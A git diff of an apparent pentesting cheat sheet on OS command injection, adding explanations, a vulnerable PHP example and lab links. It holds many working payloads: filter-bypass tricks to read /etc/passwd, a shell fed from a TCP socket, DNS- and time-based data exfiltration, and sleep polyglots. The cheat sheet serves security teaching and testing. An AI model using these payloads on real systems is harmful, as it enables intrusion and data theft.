@@ -22,19 +22,46 @@
    * [Bypass with $()](#bypass-with--1)
    * [Bypass with variable expansion](#bypass-with-variable-expansion)
    * [Bypass with wildcards](#bypass-with-wildcards)
-* [Challenge](#challenge)
-* [Time based data exfiltration](#time-based-data-exfiltration)
-* [DNS based data exfiltration](#dns-based-data-exfiltration)
+* [Data Exfiltration](#data-exfiltration)
+  * [Time based data exfiltration](#time-based-data-exfiltration)
+  * [DNS based data exfiltration](#dns-based-data-exfiltration)
 * [Polyglot command injection](#polyglot-command-injection)
-* [Backgrounding long running commands](#backgrounding-long-running-commands)
+* [Tricks](#tricks)
+  * [Backgrounding long running commands](#backgrounding-long-running-commands)
+  * [Remove arguments after the injection](#remove-arguments-after-the-injection)
+* [Labs](#labs)
+* [Challenge](#challenge)
 * [References](#references)
-    
+
 
 ## Tools
 
-* [commix - Automated All-in-One OS command injection and exploitation tool](https://github.com/commixproject/commix)
+* [commixproject/commix](https://github.com/commixproject/commix) - Automated All-in-One OS command injection and exploitation tool
+* [projectdiscovery/interactsh](https://github.com/projectdiscovery/interactsh) - An OOB interaction gathering server and client library
+
 
 ## Exploits
+
+Command injection, also known as shell injection, is a type of attack in which the attacker can execute arbitrary commands on the host operating system via a vulnerable application. This vulnerability can exist when an application passes unsafe user-supplied data (forms, cookies, HTTP headers, etc.) to a system shell. In this context, the system shell is a command-line interface that processes commands to be executed, typically on a Unix or Linux system.
+
+The danger of command injection is that it can allow an attacker to execute any command on the system, potentially leading to full system compromise.
+
+**Example of Command Injection with PHP**:    
+Suppose you have a PHP script that takes a user input to ping a specified IP address or domain:
+
+```php
+<?php
+    $ip = $_GET['ip'];
+    system("ping -c 4 " . $ip);
+?>
+```
+
+In the above code, the PHP script uses the `system()` function to execute the `ping` command with the IP address or domain provided by the user through the `ip` GET parameter.
+
+If an attacker provides input like `8.8.8.8; cat /etc/passwd`, the actual command that gets executed would be: `ping -c 4 8.8.8.8; cat /etc/passwd`.
+
+This means the system would first `ping 8.8.8.8` and then execute the `cat /etc/passwd` command, which would display the contents of the `/etc/passwd` file, potentially revealing sensitive information.
+
 
 ### Basic commands
 
@@ -46,16 +73,75 @@ root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
 bin:x:2:2:bin:/bin:/bin/sh
 sys:x:3:3:sys:/dev:/bin/sh
+...
 ```
+
 
 ### Chaining commands
 
+In many command-line interfaces, especially Unix-like systems, there are several characters that can be used to chain or manipulate commands. 
+
+
+* `;` (Semicolon): Allows you to execute multiple commands sequentially.
+* `&&` (AND): Execute the second command only if the first command succeeds (returns a zero exit status).
+* `||` (OR): Execute the second command only if the first command fails (returns a non-zero exit status).
+* `&` (Background): Execute the command in the background, allowing the user to continue using the shell.
+* `|` (Pipe):  Takes the output of the first command and uses it as the input for the second command.
+
 ```powershell
-original_cmd_by_server; ls
-original_cmd_by_server && ls
-original_cmd_by_server | ls
-original_cmd_by_server || ls   # Only if the first cmd fail
+command1; command2   # Execute command1 and then command2
+command1 && command2 # Execute command2 only if command1 succeeds
+command1 || command2 # Execute command2 only if command1 fails
+command1 & command2  # Execute command1 in the background
+command1 | command2  # Pipe the output of command1 into command2
 ```
+
+
+### Inside a command
+
+* Command injection using backticks. 
+  ```bash
+  original_cmd_by_server `cat /etc/passwd`
+  ```
+* Command injection using substitution
+  ```bash
+  original_cmd_by_server $(cat /etc/passwd)
+  ```
+
+
+## Filter Bypasses
+
+### Bypass without space
+
+* `$IFS` is a special shell variable called the Internal Field Separator. By default, in many shells, it contains whitespace characters (space, tab, newline). When used in a command, the shell will interpret `$IFS` as a space.
+  ```powershell
+  cat$IFS/etc/passwd
+  ```
+* In some shells, brace expansion generates arbitrary strings. When executed, the shell will treat the items inside the braces as separate commands or arguments.
+  ```powershell
+  {cat,/etc/passwd}
+  ```
+* Input redirection. The < character tells the shell to read the contents of the file specified. 
+  ```powershell
+  cat</etc/passwd
+  sh</dev/tcp/127.0.0.1/4242
+  ```
+* ANSI-C Quoting 
+  ```powershell
+  X=$'uname\x20-a'&&$X
+  ```
+* The tab character can sometimes be used as an alternative to spaces. In ASCII, the tab character is represented by the hexadecimal value `09`.
+  ```powershell
+  ;ls%09-al%09/home
+  ```
+* In Windows, `%VARIABLE:~start,length%` is a syntax used for substring operations on environment variables.
+  ```powershell
+  ping%CommonProgramFiles:~10,-18%127.0.0.1
+  ping%PROGRAMFILES:~10,-5%127.0.0.1
+  ```
+
+
+### Bypass with a line return
 
 Commands can also be run in sequence with newlines
 
@@ -64,101 +150,22 @@ original_cmd_by_server
 ls
 ```
 
-### Inside a command
-
-```bash
-original_cmd_by_server `cat /etc/passwd`
-original_cmd_by_server $(cat /etc/passwd)
-```
-
-## Filter Bypasses
-
-### Bypass without space
-
-Works on Linux only.
-
-```powershell
-swissky@crashlab:~/Www$ cat</etc/passwd
-root:x:0:0:root:/root:/bin/bash
-
-swissky@crashlab:~$ {cat,/etc/passwd}
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-
-swissky@crashlab:~$ cat$IFS/etc/passwd
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-
-swissky@crashlab:~$ echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd
-RCE
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-
-swissky@crashlab:~$ X=$'uname\x20-a'&&$X
-Linux crashlab 4.4.X-XX-generic #72-Ubuntu
-
-swissky@crashlab:~$ sh</dev/tcp/127.0.0.1/4242
-```
-
-Commands execution without spaces, $ or { } - Linux (Bash only)
-
-```powershell
-IFS=,;`cat<<<uname,-a`
-```
-
-Tabs work as separators in web apps where spaces are removed.
-
-```powershell
-;ls%09-al%09/home
-drwxr-xr-x  4 root root  4096 Jan 10 13:34 .
-drwxr-xr-x 18 root root  4096 Jan 10 13:33 ..
-drwx------  2 root root 16384 Jan 10 13:31 lost+found
-drwxr-xr-x  4 test test  4096 Jan 13 08:30 test
-```
-
-Works on Windows only.
-
-```powershell
-ping%CommonProgramFiles:~10,-18%IP
-ping%PROGRAMFILES:~10,-5%IP
-```
-
-### Bypass with a line return
-
-```powershell
-something%0Acat%20/etc/passwd
-```
-
-You can also write files.
-
-```powershell
-;cat>/tmp/hi<<EOF%0ahello%0aEOF
-;cat</tmp/hi
-hello
-```
 
 ### Bypass with backslash newline
 
-Commands can be broken into parts by using backslash followed by a newline
-```powershell
-❯ cat /et\
-c/pa\
-sswd
-root:x:0:0:root:/root:/usr/bin/zsh
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-[SNIP]
-```
-URL encoded form would look like this:
-```powershell
-cat%20/et%5C%0Ac/pa%5C%0Asswd
-```
+* Commands can be broken into parts by using backslash followed by a newline
+  ```powershell
+  $ cat /et\
+  c/pa\
+  sswd
+  ```
+* URL encoded form would look like this:
+  ```powershell
+  cat%20/et%5C%0Ac/pa%5C%0Asswd
+  ```
+
 
 ### Bypass characters filter via hex encoding
-
-Linux
 
 ```powershell
 swissky@crashlab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
@@ -186,6 +193,7 @@ swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 root:x:0:0:root:/root:/bin/bash
 ```
 
+
 ### Bypass characters filter
 
 Commands execution without backslash and slash - linux bash
@@ -206,6 +214,7 @@ swissky@crashlab:~$ tr '!-0' '"-1' <<< .
 swissky@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 root:x:0:0:root:/root:/bin/bash
 ```
+
 
 ### Bypass Blacklisted words
 
@@ -230,15 +239,16 @@ w\ho\am\i
 
 #### Bypass with $@
 
+`$0`: Refers to the name of the script if it's being run as a script. If you're in an interactive shell session, `$0` will typically give the name of the shell.
+
 ```powershell
 who$@ami
-
-echo $0
--> /usr/bin/zsh
 echo whoami|$0
 ```
 
+
 ### Bypass with $()
+
 ```powershell
 who$()ami
 who$(echo am)i
@@ -262,15 +272,10 @@ powershell C:\*\*2\n??e*d.*? # notepad
 @^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
 ```
 
-## Challenge
 
-Challenge based on the previous tricks, what does the following command do:
+## Data Exfiltration
 
-```powershell
-g="/e"\h"hh"/hm"t"c/\i"sh"hh/hmsu\e;tac$@<${g//hh??hm/}
-```
-
-## Time based data exfiltration
+### Time based data exfiltration
 
 Extracting data : char by char
 
@@ -286,7 +291,7 @@ user    0m0.000s
 sys 0m0.000s
 ```
 
-## DNS based data exfiltration
+### DNS based data exfiltration
 
 Based on the tool from `https://github.com/HoLyVieR/dnsbin` also hosted at dnsbin.zhack.ca
 
@@ -305,35 +310,46 @@ Online tools to check for DNS based data exfiltration:
 - dnsbin.zhack.ca
 - pingb.in
 
+
 ## Polyglot command injection
 
-```bash
-1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+A polyglot is a piece of code that is valid and executable in multiple programming languages or environments simultaneously. When we talk about "polyglot command injection," we're referring to an injection payload that can be executed in multiple contexts or environments.
 
-e.g:
-echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
-echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
-echo "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
-```
+* Example 1:
+  ```powershell
+  Payload: 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 
-```bash
-/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
+  # Context inside commands with single and double quote:
+  echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+  echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+  echo "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+  ```
+* Example 2: 
+  ```powershell
+  Payload: /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 
-e.g:
-echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
-echo "YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/"
-echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/'
-```
+  # Context inside commands with single and double quote:
+  echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
+  echo "YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/"
+  echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/'
+  ```
 
-## Backgrounding long running commands
+
+## Tricks
+
+### Backgrounding long running commands
 
 In some instances, you might have a long running command that gets killed by the process injecting it timing out.
-
-Using nohup, you can keep the process running after the parent process exits.
+Using `nohup`, you can keep the process running after the parent process exits.
 
 ```bash
 nohup sleep 120 > /dev/null &
 ```
+
+### Remove arguments after the injection
+
+In Unix-like command-line interfaces, the `--` symbol is used to signify the end of command options. After `--`, all arguments are treated as filenames and arguments, and not as options.
+
 
 ## Labs
 
@@ -342,6 +358,16 @@ nohup sleep 120 > /dev/null &
 * [Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
 * [Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)
 * [Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)
+
+
+## Challenge
+
+Challenge based on the previous tricks, what does the following command do:
+
+```powershell
+g="/e"\h"hh"/hm"t"c/\i"sh"hh/hmsu\e;tac$@<${g//hh??hm/}
+```
+
 
 ## References
 
